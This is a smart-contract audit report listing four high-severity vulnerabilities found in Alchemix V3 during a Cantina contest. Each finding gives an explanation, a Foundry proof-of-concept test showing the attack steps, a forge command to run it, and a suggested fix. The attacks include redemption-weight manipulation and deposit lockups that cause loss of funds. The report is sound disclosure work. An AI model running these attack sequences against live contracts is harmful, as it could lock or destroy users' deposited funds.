# Audit Findings – Alchemix V3

**Platform:** Cantina  
**Contest:** [alchemix-v3](https://cantina.xyz/code/e68909e6-3491-4a94-a707-ecf0c89cf72a)  
**Dates:** May 1, 2025 - May 16, 2025   
**Role:** Independent Security Researcher  
**Findings:** 4 High

---

## 🛑 High Severity Findings

### H-01: An initial dust deposit can be used to decrease debt on other accounts leading to loss of funds

#### Description and impact
An attacker can front-run the first deposit/mints of other users: they can mint a very small amount of synthetic token and create a redemption. By claiming redemption on the following block, they cause the `_redemptionWeight` to increase to reach a very large value. In subsequent syncs of accounts which minted on the same block, they will have their debt slashed by an outsized amount, but their free collateral remains unchanged. Consequently, the victims lose the ability to pay back the entirety of their original debt and re-claim their collateral.

#### Proof of Concept
Consider the following sequence of steps:

Block 1:
- Alchemist is deployed

Block 2:
- Attacker front-runs the mints of other users: making an initial dust deposit, minting 2 synthetic token
- Attacker calls `Transmuter::createRedemption` twice with synthetic deposit amount of 1 each time.
- Other users call `AlchemistV3::mint`.
- No other calls to `Transmuter::createRedemption` occur.

Block 3:
- The attacker calls `Transmuter::claimRedemption`: consequently `AlchemistV3::redeem` is called and on Alchemist.sol:576, amount = 1 and cumulativeEarmarked = 1. Therefore `_redemptionWeight` is set to the max return value `WeightIncrement` which is 2**127.
- No calls to `Transmuter::createRedemption` occur.

Block 4:
- The attacker calls `Transmuter::claimRedemption` again. Once again, amount = 1 and cumulativeEarmarked = 1 therefore `_redemptionWeight` is increased to 2**128.

After some time, more users create redemptions through the transmuter. Let's assume one of the users who was front-run by the attacker has left the account idle and so `AlchemistV3::_sync` has not been called on it again. Now, when `_sync` is called on such an account, if we reach line AlchemistV3.sol:990:

```solidity
earmarkToRedeem = PositionDecay.ScaleByWeightDelta(earmarkedState, _redemptionWeight - account.lastAccruedRedemptionWeight);
```

The current conditions will be `_redemptionWeight >= 2**128` and `account.lastAccruedRedemptionWeight = 0`. Therefore `earmarkToRedeem` is maxed out at 100% of the earmarkedState. The same logic essentially is applied on line AlchemistV3.sol:988 in the case that a redemption occurred before the current block - also causing `earmarkToRedeem` to be maxed out. Then on line AlchemistV3.sol:997 this is subtracted from the account's debt:

```solidity
account.debt -= earmarkToRedeem
```

The result is the `account.debt` will be significantly reduced, much more than other users who minted in blocks later than block 2 above. The issue is that although their debt is reduced, their free collateral is not. If they attempt to withdraw, they won't be able to withdraw the collateral associated with the debt reduction. Also, if they attempt to increase their free collateral by repaying, they can only repay up to a maximum of their account debt, which is now reduced significantly. Therefore they have lost access to a (potentially large) portion of the assets they deposited. Interestingly, an account affected by this issue cannot be liquidated in some cases: their debt has been reduced but their `collateralBalance` has not reduced as much as their debt, giving them a high collateralization ratio.

The impact is high because user funds are at risk.

It requires planning from an attacker and a specific scenario in which the attacker is not interrupted by other transmutations (which would cause the _redemptionWeight to be reduced). Conceivably, they could still force the _redemptionWeight to be very high within these early blocks after the first few calls to `AlchemistV3::mint`. There doesn't appear to be a direct financial benefit for the attacker except sabotage. Therefore likelihood is medium.

#### Proof of Concept
Add the below functions to AlchemistV3 (purely for ease of logging):

```solidity
function getAccountDebt(uint256 id) public view returns (uint256) {
        return _accounts[id].debt;
    }

    function getAccountEarmarked(uint256 id) public view returns (uint256) {
        return _accounts[id].earmarked;
    }
```

Then add this test case to `IntegrationTest`:

```solidity
function test_weightManipulation() external {
        address attacker = address(0xbeef);
        address victim = address(0xfeed);
        deal(EULER_USDC, attacker, 100_000_000_00e6);
        deal(EULER_USDC, victim, 100_000_000_00e6);

        uint256 initDepositId = 1;
        uint256 victimDepositId = 2;
        uint256 victimSecondDepositId = 3;

        uint256 initRedemptionId = 1;

        vm.startPrank(attacker);
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);
        IERC20(alUSD).approve(address(alchemist), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);
        IERC20(alUSD).approve(address(alchemist), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);

        // Attacker makes initial small deposit and mint
        alchemist.deposit(1, attacker, 0);
        alchemist.mint(initDepositId, 2, attacker);
        transmuterLogic.createRedemption(1);
        transmuterLogic.createRedemption(1);

        vm.stopPrank();

        vm.startPrank(victim);
        // Victim makes their deposit
        alchemist.deposit(1_000_000e6, victim, 0);
        // For this deposit, its `lastAccruedRedemptionWeight = 0`
        alchemist.mint(victimDepositId, alchemist.getMaxBorrowable(victimDepositId), victim);
        vm.stopPrank();

        // In subsequent blocks, attacker can manipulate `_redemptionWeight`
        vm.startPrank(attacker);
        vm.roll(block.number + 1);
        transmuterLogic.claimRedemption(1); // `_redemptionWeight` increases to `LOG2NEGFRAC_1 = 2**127`
        vm.roll(block.number + 1);
        transmuterLogic.claimRedemption(2); // `_redemptionWeight` increases to `LOG2NEGFRAC_1 * 2 = 2 **128`
        vm.stopPrank();

        vm.startPrank(victim);
        transmuterLogic.createRedemption(IERC20(alUSD).balanceOf(victim));
        // For sake of comparison, we can make a second deposit of the same value to see its behaviour
        alchemist.deposit(1_000_000e6, victim, 0);
        alchemist.mint(victimSecondDepositId, alchemist.getMaxBorrowable(victimSecondDepositId), victim);
        transmuterLogic.createRedemption(IERC20(alUSD).balanceOf(victim));

        // We wait some time for transmuation to happen
        vm.roll(block.number + transmuterLogic.timeToTransmute() / 2);
        transmuterLogic.claimRedemption(3);
        vm.stopPrank();

        // Attacker pokes the victim's account: the current `_redemptionWeight` will much much larger than the account's `lastAccruedRedemptionWeight`
        // Consequently most of the victim's debt will be gone but their free collateral is not increased
        vm.startPrank(attacker);
        alchemist.poke(victimDepositId);
        alchemist.poke(victimSecondDepositId);

        emit log_named_decimal_uint("account debt final", alchemist.getAccountDebt(victimDepositId), 18);
        emit log_named_decimal_uint("account debt final of second deposit", alchemist.getAccountDebt(victimSecondDepositId), 18);

        emit log_named_decimal_uint("account earmarked final", alchemist.getAccountEarmarked(victimDepositId), 18);
        emit log_named_decimal_uint("account earmarked final of second deposit", alchemist.getAccountEarmarked(victimSecondDepositId), 18);
    }
```

Then run the test using:

```
forge test --match-contract IntegrationTest --match-test test_weightManipulation -vvv  --fork-url <RPC URL> --fork-block-number 21835200
```

The test logs show the deposit is adversely affected (as compared to the second deposit):

```
account debt final: 460084.500000000000046006
  account debt final of second deposit: 690126.750000000000069012
  account earmarked final: 0.000000000000000000
  account earmarked final of second deposit: 230042.250000000000023004
````

#### Recommended Mitigation Steps
There does not appear to be a straightforward fix for this issue. A possible solution would be to make an initial deposit, mint debt and call `Transmuter:createRedemption` (with a non-dust amount) at the time of the alchemist deployment. This could help prevent manipulation from early small deposits like this.

**Submission details:** https://cantina.xyz/code/e68909e6-3491-4a94-a707-ecf0c89cf72a/findings/1214

### H-02: An attacker can cause initial deposits to be permanently locked by requesting redemption of a dust amount

#### Description and impact
If an attacker is able to be the first depositor and the victim makes a deposit in the next block then an attacker can cause the victim's deposit to be permanently stuck in the alchemist.

There is a chance that an attacker can cause total loss of funds to victims if the following sequence of actions occurs:

1. The alchemist is deployed.
1. The attacker back-runs the contract deployment and makes an initial dust deposit amount, and mints 1 debt token. They also request redemption through the transmuter in the same transaction.
1. In a subsequent block, the victim makes a deposit but there are no mints.
1. The attacker back-runs the victim's deposit - calling poke to ensure `_sync` is called. Consequently, `cumulativeEarmarked` increases to 1.*
1. In a subsequent block, any calls to `_earmark` will revert as `totalDebt = 1` but `cumulativeEarmarked = 2`.
After these actions, the victim can no longer get their deposit back. The only state changing method on the alchemist which can be used (apart from admin methods) is `deposit`.

*Note: the `queryGraph` result is rounded up to 1 every time on Transmuter.sol:265, even though the actual requested redemption amount is only 1. This will happen every time we call `_sync` on a new block.

The impact is high as funds could be permanently lost.

The likelihood is low as it requires the victim deposit to not be followed by any mints within the same block. Also, there is no financial gain for the attacker.

#### Proof of Concept
The below PoC can be added to `IntegrationTest` and run using

```
forge test --match-contract IntegrationTest --match-test test_initialDos -vvv  --fork-url <RPC URL> --fork-block-number 21835200
```

```solidity
    function test_initialDos() external {
        address victim = address(0xbeef);
        address attacker = address(0xfeed);

        uint256 attackerDepositId = 1;
        uint256 victimDepositId = 2;

        deal(EULER_USDC, victim, 100_000_000_00e6);
        deal(EULER_USDC, attacker, 100_000_000_00e6);

        vm.startPrank(attacker);
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);
        IERC20(alUSD).approve(address(alchemist), type(uint256).max);

        // Attacker deposits dust amount, mints and creates redemption
        alchemist.deposit(1, attacker, 0);
        alchemist.mint(attackerDepositId, 1, attacker);
        transmuterLogic.createRedemption(1);

        vm.stopPrank();

        // In the next block the victim makes a deposit and does not mint
        vm.roll(block.number + 1);
        vm.startPrank(victim);
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);
        IERC20(alUSD).approve(address(alchemist), type(uint256).max);

        alchemist.deposit(1_000_000e6, victim, 0);
        vm.stopPrank();
        vm.prank(attacker);
        // Attacker back runs the victim to ensure that `_earmark` is called, thus increasing `cumulativeEarmarked` to 1
        alchemist.poke(victimDepositId);

        // In subsequent blocks any calls to `_earmark` will fail as `totalDebt = 1`, but `cumulativeEarmarked` has increased to 2
        vm.roll(block.number + 1);

        // Victim tries to withdraw but cannot
        vm.prank(victim);
        alchemist.withdraw(1e6, victim, victimDepositId);
    }
```

#### Recommendation
A possible solution is to check to check that `cumulativeEarmarked` is no higher than `totalDebt` during `_earmark()`. It can done by changing line 1010 to:

```solidity
        if (block.number > lastEarmarkBlock && totalDebt > cumulativeEarmarked) {
```

### H-03: Calls to `_sync` / `_calculateUnrealizedDebt` after the previous redemption block may revert leading to DoS

#### Description and impact
Accounts may experience a temporary DoS when they are synced more than once after the previous redemption block and the account's lastAccruedEarmarkWeight has increased since the previous redemption.

On AlchemistV3.sol lines 985 (syncing) and 1050 (unrealized debt calculation) we have this logic:

```solidity
debtToEarmark = PositionDecay.ScaleByWeightDelta(account.debt - account.earmarked, previousRedemption.earmarkWeight - account.lastAccruedEarmarkWeight);
```

This code is only executed if we are past the `lastRedemptionBlock` and there is non-zero `_redemptionWeight`.

Let's assume a redemption has occurred at least a block ago and _`sync` is called on an account. In this case, the above line gets executed and it works as expected, and the account's `lastAccruedEarmarkWeight` is set to the current `_earmarkWeight`. After this, it's possible that `_earmarkWeight` increases as more al-asset has been sent to the transmuter, but another call to `Alchemist:redeem` has not occurred yet. If we call `_sync` on the account, we increase its `lastAccruedEarmarkWeight`. Then, any subsequent calls to `_sync` or `_calculateUnrealizedDebt` will revert, due to the fact that `previousRedemption.earmarkWeight` is now exceeded by `account.lastAccruedEarmarkWeight`.

This will cause all state updates (except for deposit) to fail on this account, until such time as `AlchemistV3::redeem` has been called again.
The user is adversely affected as they experience DoS. Also, the protocol could be affected if the account is under-collateralized as it can't be liquidated. It's possible this DoS could last some time. I have selected impact medium for these reasons.

This is quite likely to occur as the circumstances are not that unique, only requiring that a redemption occurs, followed by increasing `_earmarkWeight`.


#### Proof of Concept
Add the below test to IntegrationTest and run using:

```
forge test --match-contract IntegrationTest --match-test test_sync2xAfterLastRedemptionBlock -vvv  --fork-url <FORK URL> --fork-block-number 21835200
```

```solidity
    function test_sync2xAfterLastRedemptionBlock() external {
        deal(EULER_USDC, address(0xbeef), 100_000_000_00e6);

        vm.startPrank(address(0xbeef));
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);

        // Deposit and mint synthetic token
        alchemist.deposit(1_000_000e6, address(0xbeef), 0);
        uint256 tokenId = 1;
        alchemist.mint(tokenId, 100e18, address(0xbeef));

        // Create redemption and later claim it (causing `_redemptionWeight` to be non-zero)
        transmuterLogic.createRedemption(50e18);
        vm.roll(block.number + transmuterLogic.timeToTransmute() + 1);
        transmuterLogic.claimRedemption(1);

        // Create another redemption and cause the `_earmarkWeight` to increase
        transmuterLogic.createRedemption(50e18);
        vm.roll(block.number + 5);

        // During `mint`, the call to `_sync` will work, but the subsequent call to `_calculateUnrealizedDebt` will fail because in AlchemistV3.sol:1050
        // previousRedemption.earmarkWeight < account.lastAccruedEarmarkWeight
        alchemist.mint(tokenId, 10e18, address(0xbeef));

        vm.stopPrank();
    }
```

#### Recommended Mitigation Steps
This issue should be fixable by preventing the modification of `debtToEarmark` if `previousRedemption.earmarkWeight > account.lastAccruedEarmarkWeight`. This can be done by modifying the if statement above lines 985 and 1050 as shown:

```solidity
if (block.number > lastRedemptionBlock && _redemptionWeight != 0 && previousRedemption.earmarkWeight > account.lastAccruedEarmarkWeight) {
            debtToEarmark = PositionDecay.ScaleByWeightDelta(account.debt - account.earmarked, previousRedemption.earmarkWeight - account.lastAccruedEarmarkWeight);
```

### H-04: AlchemistV3's `totalDebt` may be less than `cumulativeEarmarked` causing funds to be permanently locked

#### Description and impact
During the `AlchemistV3::_earmark` function it is assumed that `totalDebt >= cumulativeEarmarked`, however this may not always be the case. In scenarios where `cumulativeEarmarked > totalDebt`, any call to `_earmark `reverts preventing almost all important functions on AlchemistV3 from being called. Consequently, all actions except depositing are blocked.

On AlchemistV3.sol:1011 within the `_earmark` function we have:

```solidity
_earmarkWeight += PositionDecay.WeightIncrement(amount, totalDebt - cumulativeEarmarked
```

Under typical conditions, we may expect `totalDebt > cumulativeEarmarked`, however if the repay function is called `totalDebt` will be decreased, but not `cumulativeEarmarked`. If a sufficient amount is repaid, the above line of code will always revert. This will have the following consequences:

1. Apart from admin methods, all state update functions on the `AlchemistV3` will revert except for `deposit`, as they all call `_earmark` which reverts as shown.
1. Unless the transmuter holds enough yield tokens, any further calls to `Transmuter::claimRedemption` will fail, as `AlchemistV3::redeem` will revert.

Impact is high because the user funds deposited in the alchemist can never be recovered. If there is not enough yield token held by the transmuter, then some or all of users who have requested redemption will lose their funds.

For this to be possible, we require a relatively large amount of pending redemptions (increasing `cumulativeEarmarked`) and also for sufficient repayments to occur. It is a specific but possible circumstance so the likelihood is medium.

#### Proof of Concept
Add the below test to IntegrationTest and run using:

```
forge test --match-contract IntegrationTest --match-test test_repayOverflowIssue -vvv  --fork-url <RPC URL> --fork-block-number 21835200
```

```solidity
    function test_repayOverflowIssue() external {
        deal(EULER_USDC, address(0xbeef), 100_000_000_00e6);

        vm.startPrank(address(0xbeef));
        IERC20(EULER_USDC).approve(address(alchemist), type(uint256).max);
        IERC20(alUSD).approve(address(transmuterLogic), type(uint256).max);

        alchemist.deposit(1_000_000e6, address(0xbeef), 0);
        uint256 tokenId = 1;

        // Mint (increasing totalDebt), create redemption
        alchemist.mint(tokenId, 200e18, address(0xbeef));
        transmuterLogic.createRedemption(10e18);
        vm.roll(block.number + 5_256_000 * 75 / 100);
        // Poking will set `_earmarkWeight` and `cumulativeEarmarked`
        alchemist.poke(tokenId);

        emit log_named_decimal_uint("totalDebt", alchemist.totalDebt(), 18);
        emit log_named_decimal_uint("cumulativeEarmarked", alchemist.cumulativeEarmarked(), 18);
        uint256 subDebt = (alchemist.totalDebt() - alchemist.cumulativeEarmarked()) * 105 / 100;
        uint256 repayAmount = alchemist.convertDebtTokensToYield(subDebt);
        emit log_named_decimal_uint("repayAmount", repayAmount, 6);

        alchemist.repay(repayAmount, tokenId); // decrease totalDebt, cumulativeEarmarked remains the same

        // Now totalDebt < cumulativeEarmarked
        emit log_named_decimal_uint("totalDebt after repaying", alchemist.totalDebt(), 18);
        emit log_named_decimal_uint("cumulativeEarmarked after repaying", alchemist.cumulativeEarmarked(), 18);

        // Create another redemption and go forward in time (causing AlchemistV3.sol:1011 to give a non-zero `amount`)
        transmuterLogic.createRedemption(IERC20(alUSD).balanceOf(address(0xbeef)));
        vm.roll(block.number + 10);
        // The line below reverts with "panic: arithmetic underflow or overflow (0x11)", caused by subtraction on AlchemistV3.sol:1013
        alchemist.mint(tokenId, 1e18, address(0xbeef));

        vm.stopPrank();
    }
```

#### Recommended Mitigation Steps
You may want to consider reducing `cumulativeEarmarked` during the repay function. For example, on line 514 add:

```solidity
cumulativeEarmarked -= earmarkToRemove
```
